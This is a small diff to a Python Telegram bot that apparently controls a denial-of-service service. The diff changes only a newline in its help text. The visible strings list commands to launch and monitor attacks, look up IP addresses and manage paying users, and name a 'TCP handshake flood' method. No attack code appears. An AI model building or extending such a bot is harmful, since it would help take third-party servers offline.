@@ -92,7 +92,7 @@ def handle_message(msg):
     if content_type == 'text':
         text = msg['text']
         if text == '/help':
-            bot.sendMessage(chat_id, 'User commands:\n\n/methods - Show attack methods.\n/attack - Sent attack.\n/running - Show running attacks..\n/info - Show bot information.\n/serverstatus - Show bot server status.\n/lookup - Lookup IP Address.\n\nAdmin commands:\n/adduser - Add new user.\n/removeuser - Remove user.\n/updateuser - Update user information.\n/userlist - Show all users information.')
+            bot.sendMessage(chat_id, 'User commands:\n/methods - Show attack methods.\n/attack - Sent attack.\n/running - Show running attacks..\n/info - Show bot information.\n/serverstatus - Show bot server status.\n/lookup - Lookup IP Address.\n\nAdmin commands:\n/adduser - Add new user.\n/removeuser - Remove user.\n/updateuser - Update user information.\n/userlist - Show all users information.')
         elif text == '/methods':
             bot.sendMessage(chat_id, 'List methods:\n- tls-destroy: I dont know lol\n- handshake: TCP handshake flood')
         elif text == '/info':
